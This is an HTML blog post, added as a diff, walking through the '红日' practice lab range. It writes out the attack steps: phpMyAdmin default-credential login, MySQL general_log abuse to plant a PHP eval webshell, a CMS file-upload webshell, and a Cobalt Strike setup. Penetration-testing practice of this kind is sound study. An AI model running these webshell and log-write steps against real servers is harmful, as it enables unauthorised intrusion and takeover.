@@ -1,0 +1,973 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="红日靶场一实验">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场一">
+<meta property="og:url" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/index.html">
+<meta property="og:site_name" content="zzZxby&#39;s blog">
+<meta property="og:description" content="红日靶场一实验">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202303082.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202315906.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202334830.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202348827.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202413011.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202420477.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202434143.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202443571.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202451646.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202504631.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202527815.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202532006.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202542402.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202553766.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202602087.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202609526.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202617335.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202624726.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202644798.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202652768.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202656000.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202704199.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202710545.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202718864.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202725383.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202729511.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202737054.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202740685.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202744103.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202751793.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202757574.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202806072.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202814667.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202824999.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202828376.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202831713.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202835985.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202851202.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202858208.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202905547.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202910685.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202917199.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202921411.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202927417.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202934335.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202951873.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203004425.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203011138.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203018124.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203027552.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203034925.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203054306.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203113137.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203125769.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203139294.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203145752.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203209988.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203219684.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203226701.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203230196.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203236885.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203244553.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203257153.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203303867.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203320821.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203323555.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203329816.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203342288.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203345168.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203352266.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203359210.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203422827.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203425295.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203433381.png">
+<meta property="og:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122203436195.png">
+<meta property="article:published_time" content="2024-01-22T12:35:36.000Z">
+<meta property="article:modified_time" content="2024-01-22T12:53:03.446Z">
+<meta property="article:author" content="zzZxby">
+<meta property="article:tag" content="保持学习的热情">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202303082.png">
+
+<link rel="canonical" href="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>红日靶场一 | zzZxby's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+<link rel="stylesheet" href="/dist/APlayer.min.css">
+<div id="aplayer"></div>
+<script type="text/javascript" src="/dist/APlayer.min.js"></script>
+<script type="text/javascript" src="/dist/music.js"></script>
+
+
+
+
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">zzZxby's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/zzZ.jpg">
+      <meta itemprop="name" content="zzZxby">
+      <meta itemprop="description" content="看山是山，看水是水">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zzZxby's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          红日靶场一
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-01-22 20:35:36 / 修改时间：20:53:03" itemprop="dateCreated datePublished" datetime="2024-01-22T20:35:36+08:00">2024-01-22</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+            <div class="post-description">红日靶场一实验</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="网络配置">网络配置</h1>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202303082.png"></p>
+<p>Kali网络配置：</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202315906.png"></p>
+<p>Win7网络配置：</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202334830.png"></p>
+<p>Win2003和Win2008网络配置：</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202348827.png"></p>
+<h1 id="信息收集过程">信息收集过程</h1>
+<p>先用kali扫描同网段IP，获取目标机的ip</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202413011.png"></p>
+<p>获取目标主机ip之后，扫描端口号，探测目标开启的服务</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202420477.png"></p>
+<p>可以看到开放了80端口，http服务，尝试访问web服务</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202434143.png"></p>
+<p>信息收集之目录扫描，使用御剑工具扫描目录</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202443571.png"></p>
+<p>发现使用的是phpmyadmin进行php管理，访问后台页面</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202451646.png"></p>
+<p>phpmyadmin后台默认登陆账号密码为root/root，尝试登陆后台</p>
+<p>登陆成功</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202504631.png"></p>
+<h1 id="漏洞发现过程">漏洞发现过程</h1>
+<p>Phpmyadmin后台可以进行sql语句的执行操作，思路尝试利用sql语句写入一句话木马</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202527815.png"></p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202532006.png"></p>
+<p>先查看网站的路径信息，select @<span class="citation" data-cites="basedir">@basedir</span>;</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202542402.png"></p>
+<p>说明这个就是用phpstduy搭建的一个web应用。</p>
+<p>网站路径为/phpStudy/WWW</p>
+<p>然后查看当前用户的写权限 show variables like “secure_file_priv”;</p>
+<p>发现对应的值为空，不允许导入和导出操作</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202553766.png"></p>
+<p>换个思路，尝试将木马写入日志文件中，先查看mysql的日志文件配置</p>
+<p>show variables like “%log%”;</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202602087.png"></p>
+<p>第一个配置是代表是否开启了日志功能，第二个日志文件的存放位置</p>
+<p>所以，可以将第一个配置更改为”On”，第二个配置的文件目录改为一个php文件，用来解析我们的一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set global general_log=”on”;</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202609526.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set global general_log_file=”C:/phpStudy/WWW/shell.php”;</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202617335.png"></p>
+<p>查看一下更改结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like “%log%”;</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202624726.png"></p>
+<p>写入一句话木马，因为不允许写操作，所以会产生报错信息</p>
+<p>但是根据我们的修改，保存信息会存放在日志信息中，并且当作php解析，完成了木马的写入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select ‘&lt;?php eval($_POST[attack]);?&gt;’;</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202644798.png"></p>
+<p>木马写入成功后，访问文件，然后使用蚁剑链接</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202652768.png"></p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202656000.png"></p>
+<p>在phpmyadmin界面可以看到一个xycms的数据库，猜测可能存在一个xycms的网站</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202704199.png"></p>
+<p>尝试访问该web应用</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202710545.png"></p>
+<p>站内进行信息收集过程，可以看在公告信息处看到默认的后台地址与账号密码</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202718864.png"></p>
+<p>尝试登陆后台</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202725383.png"></p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202729511.png"></p>
+<p>在后台搜寻漏洞点，在前台模块板块找到文件上传点，尝试写入一句话木马</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202737054.png"></p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202740685.png"></p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202744103.png"></p>
+<p>文件上传成功，但是这个文件路径未知，需要寻找文件的保存路径</p>
+<p>之前用御剑扫描得到过一个备份文件</p>
+<p>我们可以根据备份文件确定目录结构</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202751793.png"></p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202757574.png"></p>
+<p>查看文件目录结构</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202806072.png"></p>
+<p>这个目录就是刚才上传木马的地方</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202814667.png"></p>
+<p>访问文件之后，使用蚁剑链接</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202824999.png"></p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202828376.png"></p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202831713.png"></p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202835985.png"></p>
+<h1 id="使用cs上线目标靶机">使用CS上线目标靶机</h1>
+<p>启动服务端</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202851202.png"></p>
+<p>启动客户端</p>
+<p><img src="/2024/01/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80/image-20240122202858208.png"></p>
+<p>在cs中添加监听器</p>
